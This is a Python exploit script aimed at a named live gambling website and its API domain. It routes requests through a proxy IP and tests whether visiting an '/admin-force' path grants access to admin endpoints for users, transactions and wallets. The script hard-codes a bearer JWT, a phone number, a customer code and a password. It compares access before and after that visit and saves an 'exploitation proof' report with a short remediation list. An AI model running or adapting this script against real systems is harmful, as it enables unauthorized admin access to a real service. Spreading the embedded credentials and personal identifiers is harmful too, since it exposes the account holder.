#!/usr/bin/env python3

import requests
import json
import time
import sys
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# Configuration with existing JWT token
TARGET_DOMAIN = "https://pigslot.co"
API_DOMAIN = "https://jklmn23456.com"
ADMIN_FORCE_PATH = "/admin-force"
PHONE_NUMBER = "0960422161"
CUSTOMER_CODE = "PS663888386"

# JWT Token from previous successful authentication
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyODE3NTAsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.IyZ8E-6rBsH7S1fqpMwrMYWoI8pVuB2Z3bXvE0F7Ndw"

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;41m[CRITICAL] {message}\033[0m")

def get_session():
    """Create authenticated session"""
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'th,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Origin': TARGET_DOMAIN,
        'Referer': f'{TARGET_DOMAIN}/',
        'Authorization': f'bearer {JWT_TOKEN}',
        'Username': PHONE_NUMBER,
        'Password': '181242',
    })
    return session

def test_before_admin_force():
    """Test access to admin endpoints BEFORE accessing admin-force"""
    print_info("🔍 PHASE 1: Testing admin access BEFORE admin-force...")
    
    session = get_session()
    
    admin_tests = [
        f"{API_DOMAIN}/api/v1/admin/users",
        f"{API_DOMAIN}/api/v1/admin/dashboard", 
        f"{API_DOMAIN}/api/v1/admin/system",
        f"{TARGET_DOMAIN}/admin",
        f"{TARGET_DOMAIN}/admin/dashboard",
    ]
    
    before_results = {}
    
    for url in admin_tests:
        try:
            response = session.get(url, timeout=10, verify=False)
            before_results[url] = {
                'status': response.status_code,
                'accessible': response.status_code == 200,
                'content_length': len(response.text) if response.status_code == 200 else 0
            }
            
            if response.status_code == 200:
                print_warning(f"⚠️  BEFORE: {url} - ACCESSIBLE (Status: 200)")
            elif response.status_code == 403:
                print_info(f"🔒 BEFORE: {url} - FORBIDDEN (Status: 403)")
            elif response.status_code == 401:
                print_info(f"🔑 BEFORE: {url} - UNAUTHORIZED (Status: 401)")
            else:
                print_info(f"❌ BEFORE: {url} - Status: {response.status_code}")
                
        except Exception as e:
            before_results[url] = {'status': 'ERROR', 'accessible': False, 'error': str(e)}
    
    return before_results

def access_admin_force():
    """Access admin-force endpoint and analyze response"""
    print_info("🚨 PHASE 2: Accessing /admin-force to trigger privilege escalation...")
    
    session = get_session()
    admin_force_url = f"{TARGET_DOMAIN}{ADMIN_FORCE_PATH}"
    
    try:
        # Access admin-force endpoint
        response = session.get(admin_force_url, timeout=15, verify=False)
        
        if response.status_code == 200:
            print_success(f"✅ Admin-force endpoint accessible: {len(response.text)} bytes")
            
            # Check for admin indicators in response
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel',
                'กำลังติดตั้ง cookies สำหรับ admin',
                'AdminForce', 'admin_state', 'admin-panel'
            ]
            
            content = response.text.lower()
            found_indicators = [ind for ind in admin_indicators if ind in content]
            
            if found_indicators:
                print_critical(f"🎯 ADMIN INDICATORS FOUND: {found_indicators}")
            
            # Look for JavaScript that sets admin state
            js_patterns = [
                r't\(a\.F\.ADMIN,!0\)',
                r'AdminForce.*function',
                r'admin.*state.*true',
                r'setAdmin\s*\(',
                r'กำลังติดตั้ง.*admin'
            ]
            
            admin_js_found = []
            for pattern in js_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    admin_js_found.extend(matches)
                    print_critical(f"🔥 ADMIN JS FUNCTION FOUND: {matches}")
            
            # Check if cookies changed
            new_cookies = dict(session.cookies)
            print_info(f"Cookies after admin-force: {len(new_cookies)} cookies")
            
            return True, response.text, admin_js_found, new_cookies
        else:
            print_error(f"Failed to access admin-force: Status {response.status_code}")
            return False, None, [], {}
            
    except Exception as e:
        print_error(f"Error accessing admin-force: {e}")
        return False, None, [], {}

def test_after_admin_force():
    """Test access to admin endpoints AFTER accessing admin-force"""
    print_info("🎯 PHASE 3: Testing admin access AFTER admin-force...")
    
    session = get_session()
    
    # First access admin-force to set admin state
    admin_force_url = f"{TARGET_DOMAIN}{ADMIN_FORCE_PATH}"
    try:
        session.get(admin_force_url, timeout=15, verify=False)
        print_success("Admin-force re-accessed to ensure admin state is set")
    except:
        pass
    
    admin_tests = [
        f"{API_DOMAIN}/api/v1/admin/users",
        f"{API_DOMAIN}/api/v1/admin/dashboard", 
        f"{API_DOMAIN}/api/v1/admin/system",
        f"{API_DOMAIN}/api/v1/admin/config",
        f"{API_DOMAIN}/api/v1/admin/statistics",
        f"{API_DOMAIN}/api/v1/admin/transactions",
        f"{API_DOMAIN}/api/v1/admin/wallet/all",
        f"{API_DOMAIN}/api/v1/admin/loyalty/users",
        f"{TARGET_DOMAIN}/admin",
        f"{TARGET_DOMAIN}/admin/dashboard",
        f"{TARGET_DOMAIN}/admin/users",
        f"{TARGET_DOMAIN}/admin/settings",
    ]
    
    after_results = {}
    admin_access_gained = False
    
    for url in admin_tests:
        try:
            response = session.get(url, timeout=10, verify=False)
            after_results[url] = {
                'status': response.status_code,
                'accessible': response.status_code == 200,
                'content_length': len(response.text) if response.status_code == 200 else 0
            }
            
            if response.status_code == 200:
                print_critical(f"🚨 AFTER: {url} - ACCESSIBLE! (Status: 200)")
                
                # Check if response contains admin data
                try:
                    data = response.json()
                    if is_admin_data(data):
                        print_critical(f"💥 ADMIN DATA DETECTED: {str(data)[:200]}...")
                        admin_access_gained = True
                except:
                    # Check HTML for admin content
                    if is_admin_html(response.text):
                        print_critical(f"💥 ADMIN INTERFACE DETECTED!")
                        admin_access_gained = True
                        
            elif response.status_code == 403:
                print_info(f"🔒 AFTER: {url} - Still forbidden (Status: 403)")
            elif response.status_code == 401:
                print_info(f"🔑 AFTER: {url} - Still unauthorized (Status: 401)")
            else:
                print_info(f"❌ AFTER: {url} - Status: {response.status_code}")
                
        except Exception as e:
            after_results[url] = {'status': 'ERROR', 'accessible': False, 'error': str(e)}
    
    return after_results, admin_access_gained

def is_admin_data(data):
    """Check if data contains admin information"""
    if not data:
        return False
    
    admin_keywords = ['users', 'admin', 'dashboard', 'statistics', 'management', 'config']
    data_str = str(data).lower()
    
    # Check for multiple users (admin user list)
    if isinstance(data, list) and len(data) > 1:
        return True
    
    # Check for admin keywords in response
    if any(keyword in data_str for keyword in admin_keywords):
        return True
    
    return False

def is_admin_html(html):
    """Check if HTML contains admin interface"""
    if not html:
        return False
        
    admin_html_keywords = [
        'admin panel', 'dashboard', 'user management', 'control panel',
        'administration', 'admin interface', 'management console'
    ]
    
    html_lower = html.lower()
    return any(keyword in html_lower for keyword in admin_html_keywords)

def compare_results(before, after):
    """Compare before and after results to show privilege escalation"""
    print_info("📊 PHASE 4: Comparing results to prove privilege escalation...")
    
    escalated_endpoints = []
    
    for url in before.keys():
        before_accessible = before.get(url, {}).get('accessible', False)
        after_accessible = after.get(url, {}).get('accessible', False)
        
        if not before_accessible and after_accessible:
            print_critical(f"🎯 PRIVILEGE ESCALATION CONFIRMED: {url}")
            print_critical(f"   BEFORE: Not accessible")
            print_critical(f"   AFTER:  ACCESSIBLE!")
            escalated_endpoints.append(url)
        elif before_accessible and after_accessible:
            print_info(f"✓ {url} - Already accessible")
        elif not before_accessible and not after_accessible:
            print_info(f"- {url} - Still not accessible")
    
    return escalated_endpoints

def generate_exploitation_proof(before_results, after_results, escalated_endpoints, admin_js_found):
    """Generate proof of exploitation"""
    
    exploitation_confirmed = len(escalated_endpoints) > 0
    
    proof = {
        'vulnerability': 'Admin Privilege Escalation via /admin-force',
        'target': TARGET_DOMAIN,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'exploitation_successful': exploitation_confirmed,
        'admin_force_accessible': True,
        'admin_javascript_found': len(admin_js_found) > 0,
        'admin_functions_detected': admin_js_found,
        'endpoints_tested': len(before_results),
        'escalated_endpoints': len(escalated_endpoints),
        'escalated_urls': escalated_endpoints,
        'before_results': before_results,
        'after_results': after_results
    }
    
    # Generate detailed report
    report = f"""
🚨 ADMIN PRIVILEGE ESCALATION EXPLOITATION PROOF
===============================================

Target: {TARGET_DOMAIN}
Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
User: {PHONE_NUMBER} (Customer: {CUSTOMER_CODE})

💥 EXPLOITATION STATUS: {'SUCCESS' if exploitation_confirmed else 'PARTIAL'}

🎯 VULNERABILITY SUMMARY:
========================
- Admin-Force Endpoint: ACCESSIBLE ✅
- JavaScript Admin Functions: {'FOUND' if admin_js_found else 'NOT FOUND'} {'✅' if admin_js_found else '❌'}
- Admin Privilege Escalation: {'CONFIRMED' if exploitation_confirmed else 'NOT CONFIRMED'} {'✅' if exploitation_confirmed else '❌'}
- Escalated Endpoints: {len(escalated_endpoints)}

🔍 ADMIN FUNCTIONS DETECTED:
============================
"""
    
    for func in admin_js_found:
        report += f"- {func}\n"
    
    report += f"""
🚨 ESCALATED ENDPOINTS:
======================
"""
    
    for url in escalated_endpoints:
        report += f"✅ {url}\n"
    
    report += f"""
📊 DETAILED COMPARISON:
======================
"""
    
    for url in before_results.keys():
        before_status = before_results[url].get('status', 'Unknown')
        after_status = after_results.get(url, {}).get('status', 'Unknown')
        
        report += f"URL: {url}\n"
        report += f"  BEFORE: {before_status}\n"
        report += f"  AFTER:  {after_status}\n"
        
        if url in escalated_endpoints:
            report += f"  RESULT: 🚨 PRIVILEGE ESCALATION!\n"
        report += f"\n"
    
    report += f"""
⚠️ IMPACT ASSESSMENT:
====================
Risk Level: {'CRITICAL' if exploitation_confirmed else 'HIGH'}
CVSS Score: {'9.8' if exploitation_confirmed else '7.5'}

This vulnerability {'allows' if exploitation_confirmed else 'potentially allows'}:
- Admin privilege escalation via /admin-force endpoint
- Access to administrative interfaces
- Potential access to sensitive user data
- Bypass of authentication controls

🛡️ REMEDIATION:
===============
1. IMMEDIATELY disable /admin-force endpoint
2. Remove AdminForce JavaScript function
3. Implement proper server-side authorization
4. Add authentication checks for admin functions
5. Regular security audits

{'🚨 CRITICAL: This vulnerability has been successfully exploited!' if exploitation_confirmed else '⚠️ WARNING: This vulnerability poses a significant security risk.'}
"""
    
    return proof, report

def main():
    print_critical("🎯 ADMIN-FORCE PRIVILEGE ESCALATION EXPLOITATION")
    print_critical("=" * 80)
    print_info(f"Target: {TARGET_DOMAIN}")
    print_info(f"User: {PHONE_NUMBER}")
    print_info(f"Customer: {CUSTOMER_CODE}")
    print_info("")
    
    # Phase 1: Test before admin-force
    before_results = test_before_admin_force()
    
    # Phase 2: Access admin-force
    admin_force_success, admin_force_content, admin_js_found, cookies = access_admin_force()
    
    if not admin_force_success:
        print_error("Failed to access admin-force endpoint")
        return
    
    # Phase 3: Test after admin-force
    after_results, admin_access_gained = test_after_admin_force()
    
    # Phase 4: Compare results
    escalated_endpoints = compare_results(before_results, after_results)
    
    # Phase 5: Generate proof
    proof, report = generate_exploitation_proof(before_results, after_results, escalated_endpoints, admin_js_found)
    
    # Display final results
    print_info("\n" + "=" * 80)
    print_critical("🎯 FINAL EXPLOITATION RESULTS")
    print_critical("=" * 80)
    
    if escalated_endpoints:
        print_critical("✅ ADMIN PRIVILEGE ESCALATION SUCCESSFULLY EXPLOITED!")
        print_critical(f"✅ {len(escalated_endpoints)} ADMIN ENDPOINTS NOW ACCESSIBLE!")
        print_critical("✅ VULNERABILITY CONFIRMED AND PROVEN!")
        
        for endpoint in escalated_endpoints:
            print_critical(f"   🚨 {endpoint}")
    else:
        if admin_js_found:
            print_warning("⚠️  Admin JavaScript functions found but no direct API access gained")
            print_warning("⚠️  Vulnerability exists but may require additional exploitation")
        else:
            print_warning("❌ No clear privilege escalation detected")
    
    if admin_js_found:
        print_critical(f"✅ ADMIN JAVASCRIPT FUNCTIONS DETECTED: {len(admin_js_found)}")
        for func in admin_js_found:
            print_critical(f"   🔥 {func}")
    
    # Save proof
    with open('ADMIN_FORCE_EXPLOITATION_PROOF.txt', 'w', encoding='utf-8') as f:
        f.write(report)
    
    with open('ADMIN_FORCE_EXPLOITATION_DATA.json', 'w', encoding='utf-8') as f:
        json.dump(proof, f, indent=2, ensure_ascii=False)
    
    print_success("\n📄 Exploitation proof saved to:")
    print_success("   - ADMIN_FORCE_EXPLOITATION_PROOF.txt")
    print_success("   - ADMIN_FORCE_EXPLOITATION_DATA.json")
    
    if escalated_endpoints:
        print_critical("\n🚨 VULNERABILITY SUCCESSFULLY EXPLOITED!")
        print_critical("This proves the /admin-force endpoint is a CRITICAL security flaw!")
    else:
        print_info("\n📋 Check the detailed reports for complete analysis")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()